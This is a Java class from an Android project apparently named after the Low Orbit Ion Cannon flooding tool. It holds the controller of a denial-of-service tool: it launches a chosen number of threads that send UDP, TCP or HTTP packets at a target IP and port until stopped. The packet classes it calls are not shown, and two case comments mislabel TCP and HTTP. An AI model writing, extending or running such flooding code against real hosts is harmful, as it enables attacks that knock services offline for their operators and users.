package com.genius.rifatrashid.loworbitioncannon;

import java.net.InetAddress;

/**
 * Created by Rifat Rashid on 8/10/2015.
 */
public class managerClass {

    public static boolean firing = false;

    public managerClass() {

    }

    public void start(InetAddress ip, int port, int threads, byte[] data, int methodType, int pause) {
        firing = true;
        switch (methodType) {
            //UDP
            case 1:
                try {
                    UDPpacket[] udPpacketsThread = new UDPpacket[threads];
                    for (int i = 0; i < threads; i++) {
                        udPpacketsThread[i] = new UDPpacket(ip, data, port, pause);
                        new Thread(udPpacketsThread[i]).start();
                    }
                } catch (Exception io) {
                    io.printStackTrace();
                }
                break;
            //HTTP
            case 2:
                try {
                    TCPpacket[] tcpPacketsThread = new TCPpacket[threads];
                    for (int i = 0; i < threads; i++) {
                        tcpPacketsThread[i] = new TCPpacket(ip, data, port, pause);
                        new Thread(tcpPacketsThread[i]).start();
                    }
                } catch (Exception io) {
                    io.printStackTrace();
                }
                break;
            //TCP
            case 3:
                try {
                    HTTPpacket[] httpPacketsThread = new HTTPpacket[threads];
                    for (int i = 0; i < threads; i++) {
                        httpPacketsThread[i] = new HTTPpacket(ip, data, port, pause);
                        new Thread(httpPacketsThread[i]).start();
                    }
                } catch (Exception io) {
                    io.printStackTrace();
                }
                break;
        }
    }

    public void stop() {
        firing = false;
    }
}
